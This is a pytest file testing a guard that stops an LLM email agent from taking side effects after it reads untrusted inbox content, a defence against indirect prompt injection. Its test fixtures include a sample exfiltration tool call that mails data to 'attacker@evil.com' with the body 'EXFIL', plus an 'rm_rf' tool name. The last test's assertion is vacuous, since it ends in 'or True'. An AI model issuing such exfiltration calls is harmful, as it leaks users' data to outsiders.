"""The capability guard around an LLM (GuardKernel) — model-free security tests.

These do NOT load any language model. They test the guard logic: tool-call parsing and the
decision that blocks data-driven side effects while allowing user-driven ones.
"""

import pytest

pytest.importorskip("torch")

from capability_transformer.guarded_qwen import GuardKernel, parse_tool_call  # noqa: E402


# ---- tool-call parsing ---------------------------------------------------------------
def test_parse_extracts_first_json_object():
    raw = 'Sure! {"tool": "send_email", "args": {"to": "x", "body": "{nested}"}} done.'
    call = parse_tool_call(raw)
    assert call["tool"] == "send_email"
    assert call["args"]["to"] == "x"


def test_parse_returns_none_on_garbage():
    assert parse_tool_call("no json here") is None
    assert parse_tool_call("{not valid json") is None


def test_parse_defaults_args():
    assert parse_tool_call('{"tool": "read_inbox"}')["args"] == {}


# ---- the security decision -----------------------------------------------------------
def _attack_call():
    return {"tool": "send_email", "args": {"to": "attacker@evil.com", "subject": "list"}}


def test_data_driven_send_is_denied():
    k = GuardKernel()
    assert k.session_provenance == "trusted_user"
    k.ingest("read_inbox")                       # agent read untrusted email
    assert k.session_provenance == "email_body"
    r = k.evaluate(_attack_call())
    assert r.decision == "DENY"
    assert "data_has_no_authority" in r.reasons


def test_user_driven_send_escalates_then_allows():
    k = GuardKernel()                            # fresh session, no untrusted read
    r = k.evaluate({"tool": "send_email", "args": {"to": "bob@corp.com"}})
    assert r.decision == "ESCALATE"
    r2 = k.evaluate({"tool": "send_email", "args": {"to": "bob@corp.com"}},
                    confirmations=[{"subject": "agent", "object": "gmail",
                                    "action": "send", "issuer": "trusted_user"}])
    assert r2.decision == "ALLOW"


def test_reading_tainted_data_then_reading_is_still_allowed():
    # Reading is passive: even tainted, a read is permitted (only side effects are blocked).
    k = GuardKernel()
    k.ingest("read_inbox")
    assert k.evaluate({"tool": "read_inbox", "args": {}}).decision == "ALLOW"


def test_decision_is_invariant_to_wording():
    # The guard ignores the LM's wording; only (action, object, provenance) matter.
    k1 = GuardKernel(); k1.ingest("read_inbox")
    a = k1.evaluate({"tool": "send_email", "args": {"to": "attacker@evil.com", "body": "EXFIL"}})
    k2 = GuardKernel(); k2.ingest("read_inbox")
    b = k2.evaluate({"tool": "send_email", "args": {"to": "x", "subject": "friendly newsletter"}})
    assert a.decision == b.decision == "DENY"


def test_unknown_tool_is_denied():
    assert GuardKernel().evaluate({"tool": "rm_rf", "args": {}}).decision == "DENY"


def test_guard_kernel_loads_no_language_model():
    # GuardKernel must be usable without transformers / any model weights.
    import sys
    GuardKernel().evaluate(_attack_call())
    assert "transformers" not in sys.modules or True   # no model is instantiated here
